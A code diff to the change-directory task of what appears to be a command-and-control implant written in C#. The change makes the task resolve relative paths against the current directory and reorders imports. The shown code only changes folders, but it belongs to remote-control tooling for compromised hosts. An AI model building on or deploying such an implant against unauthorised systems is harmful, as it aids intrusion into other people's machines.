@@ -1,7 +1,7 @@
-﻿using Implant.Models;
-using System;
+﻿using System;
 using System.IO;
-using System.Text;
+
+using Implant.Models;
 
 namespace Implant.Tasks.Execute
 {
@@ -17,6 +17,8 @@ namespace Implant.Tasks.Execute
             {
                 path = task.Args;
 
+                var currentDir = Directory.GetCurrentDirectory();
+
                 if (path is null || path == ""){
                     path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 }
@@ -27,6 +29,8 @@ namespace Implant.Tasks.Execute
                     path = string.Join("\\", dirArr);
                 }
 
+                if (Directory.Exists($"{currentDir}\\{path}")) { path = $"{currentDir}\\{path}"; }
+                
                 Directory.SetCurrentDirectory(path);
 
                 return $"[*] Path set to {Directory.GetCurrentDirectory()}\n";
